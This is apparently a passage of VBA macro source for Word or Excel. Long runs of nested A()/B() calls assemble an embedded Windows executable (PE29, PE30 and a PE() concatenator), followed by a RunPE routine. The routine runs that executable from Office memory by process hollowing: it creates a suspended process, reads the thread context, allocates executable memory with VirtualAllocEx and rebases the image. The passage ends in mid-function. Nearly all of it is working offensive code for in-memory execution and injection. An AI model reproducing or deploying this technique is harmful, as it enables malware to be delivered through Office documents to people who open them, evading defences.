    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE29 = strPE
End Function

Private Function PE30() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "NB10"), 0), 0), 0), 0), "6"), 128), 193), "J"), 1), 0), 0), 0), "C:\loc")
    strPE = B(strPE, "al0\asf\release\build-2.2.14\support\Release\ab.pd")
    strPE = A(B(strPE, "b"), 0)

    PE30 = strPE
End Function

Private Function PE() As String
    Dim strPE As String
    strPE = ""
    strPE = strPE + PE0()
    strPE = strPE + PE1()
    strPE = strPE + PE2()
    strPE = strPE + PE3()
    strPE = strPE + PE4()
    strPE = strPE + PE5()
    strPE = strPE + PE6()
    strPE = strPE + PE7()
    strPE = strPE + PE8()
    strPE = strPE + PE9()
    strPE = strPE + PE10()
    strPE = strPE + PE11()
    strPE = strPE + PE12()
    strPE = strPE + PE13()
    strPE = strPE + PE14()
    strPE = strPE + PE15()
    strPE = strPE + PE16()
    strPE = strPE + PE17()
    strPE = strPE + PE18()
    strPE = strPE + PE19()
    strPE = strPE + PE20()
    strPE = strPE + PE21()
    strPE = strPE + PE22()
    strPE = strPE + PE23()
    strPE = strPE + PE24()
    strPE = strPE + PE25()
    strPE = strPE + PE26()
    strPE = strPE + PE27()
    strPE = strPE + PE28()
    strPE = strPE + PE29()
    strPE = strPE + PE30()
    PE = strPE
End Function
' ===== END PE2VBA =====


' ================================================================================
'                                   ~~~ MAIN ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    RunPE
' Desc:      Main method. Executes a PE from the memory of Word/Excel
' Arguments: baImage - A Byte array representing a PE file
'            strArguments - A String representing the command line arguments
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)

    Debug.Print ("[*] Checking source PE...")
    ' Populate IMAGE_DOS_HEADER structure
    ' |__ IMAGE_DOS_HEADER size is 64 (0x40)
    Dim structDOSHeader As IMAGE_DOS_HEADER
    Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), SIZEOF_IMAGE_DOS_HEADER)
    
    
    ' Check Magic Number (i.e. is it a PE file?)
    ' |__ Magic number = 0x5A4D or 23117 or 'MZ'
    If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ Magic number is OK.")
        End If
    Else
        Debug.Print ("    |__ Input file is not a valid PE.")
        Exit Sub
    End If
    
    
    ' Populate IMAGE_NT_HEADERS structure
    ' |__ IMAGE_NT_HEADERS start at offset DOSHeader->e_lfanew
    ' |__ IMAGE_NT_HEADERS size is 248 (0xf8) (32 bits)
    ' |__ IMAGE_NT_HEADERS size is 264 (0x108) (64 bits)
    Dim structNTHeaders As IMAGE_NT_HEADERS
    Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
    Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
    
    
    ' Check NT headers Signature
    ' |__ NT Header Signature = 'PE00' or 0x00004550 or 17744
    If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ NT Header Signature is OK.")
        End If
    Else
        Debug.Print ("    |__ NT Header Signature is not valid.")
        Exit Sub
    End If
    
    
    ' Check CPU architecture
    If VERBOSE Then
        Debug.Print ("    |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
    End If
    #If Win64 Then
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
            Debug.Print ("[-] You're trying to inject a 32 bits binary into a 64 bits process!")
            Exit Sub
        End If
    #Else
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64 Then
            Debug.Print ("[-] You're trying to inject a 64 bits binary into a 32 bits process!")
            Exit Sub
        End If
    #End If
    
    
    ' Get the path of the current process executable
    Dim strCurrentFilePath As String
    strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
    Dim lGetModuleFileName As Long
    lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
    
    
    ' Format command line
    Dim strCmdLine As String
    strCmdLine = strCurrentFilePath + " " + strArguments
    
    
    ' Create new process in suspended state
    Debug.Print ("[*] Creating new process in suspended state...")
    Dim strNull As String
    Dim structProcessInformation As PROCESS_INFORMATION
    Dim structStartupInfo As STARTUPINFO
    If VERBOSE Then
        Debug.Print ("    |__ Target PE: '" + strCurrentFilePath + "'")
    End If
    Dim lCreateProcess As Long
    lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
    If lCreateProcess = 0 Then
        Debug.Print ("    |__ CreateProcess() failed (Err: " + Str(Err.LastDllError) + ").")
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ CreateProcess() OK")
        End If
    End If
    
    
    ' Get Thread Context
    Debug.Print ("[*] Retrieving the context of the main thread...")
    Dim structContext As CONTEXT
    structContext.ContextFlags = CONTEXT_INTEGER 'CONTEXT_FULL
    Dim lGetThreadContext As Long
    #If Win64 Then
        Dim baContext(0 To (LenB(structContext) - 1)) As Byte
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lGetThreadContext = 0 Then
        Debug.Print ("    |__ GetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        #If Win64 Then
            Call RtlMoveMemory(VarPtr(structContext), VarPtr(baContext(0)), LenB(structContext))
        #End If
        If VERBOSE Then
            Debug.Print ("    |__ GetThreadContext() OK")
        End If
    End If
    
    
    ' Get image base of the target process (if we want to unmap it before injecting our PE)
    ' |__ Image base address is CONTEXT.ebx + 8 (32 bits)
    ' |__ Image base address is CONTEXT.rdx + 16 (64 bits)
    'Debug.Print ("[*] Reading target process base image address...")
    'Dim ptrTargetImageBase As LongPtr
    'Dim ptrTargetImageBaseLocation As LongPtr
    '#If Win64 Then
    '    ptrTargetImageBaseLocation = structContext.Rdx + 16
    '#Else
    '    ptrTargetImageBaseLocation = structContext.Ebx + 8
    '#End If
    
    'Dim lReadProcessMemory As Long
    'lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, ptrTargetImageBaseLocation, VarPtr(ptrTargetImageBase), SIZEOF_ADDRESS, 0)
    'If lReadProcessMemory = 0 Then
    '    Debug.Print ("    |__ ReadProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
    '    Call TerminateProcess(structProcessInformation.hProcess, 0)
    '    Exit Sub
    'Else
    '    If VERBOSE Then
    '        Debug.Print ("    |__ Target process image base address: Ox" + Hex(ptrTargetImageBase))
    '    End If
    'End If
    
    
    ' Unmap target image (optional)
    ' We don't really need to unmap the current image
    
    
    ' Get Relocation directory and check if the PE has a relocation table
    ' |__ NTHeaders.OptionalHeader.DataDirectory[5]
    Dim structRelocDirectory As IMAGE_DATA_DIRECTORY
    Call RtlMoveMemory(VarPtr(structRelocDirectory), VarPtr(structNTHeaders.OptionalHeader.DataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC)), SIZEOF_IMAGE_DATA_DIRECTORY)
    
    Dim ptrDesiredImageBase As LongPtr: ptrDesiredImageBase = 0
    If structRelocDirectory.VirtualAddress = 0 Then
        Debug.Print ("[!] PE has no relocation table, using default base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
        ptrDesiredImageBase = structNTHeaders.OptionalHeader.ImageBase
    End If
    

    ' Allocate memory for the source image in the new process
    Debug.Print ("[*] Allocating memory for the source image in process with PID" + Str(structProcessInformation.dwProcessId) + "...")
    If VERBOSE Then
        Debug.Print ("    |__ PE image size: " + Str(structNTHeaders.OptionalHeader.SizeOfImage))
    End If
    Dim ptrProcessImageBase As LongPtr
    ptrProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, ptrDesiredImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrProcessImageBase = 0 Then
        Debug.Print ("    |__ VirtualAllocEx() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ VirtualAllocEx() OK - Got Addr: 0x" + Hex(ptrProcessImageBase))
        End If
    End If
    
    
    ' Change the image base saved in headers
    ' |__ IMAGE_NT_HEADERS is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew
    ' |__ IMAGE_NT_HEADERS = Signature || IMAGE_FILE_HEADER || IMAGE_OPTIONAL_HEADER
    ' |__ In IMAGE_OPTIONAL_HEADER32, ImageBase is at offset 28
    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
    ' |__ In IMAGE_OPTIONAL_HEADER64, ImageBase is at offset 24
    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        Dim lImageBaseAddrOffset As Long
        Dim ptrImageBase As LongPtr
        #If Win64 Then
            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
        #Else
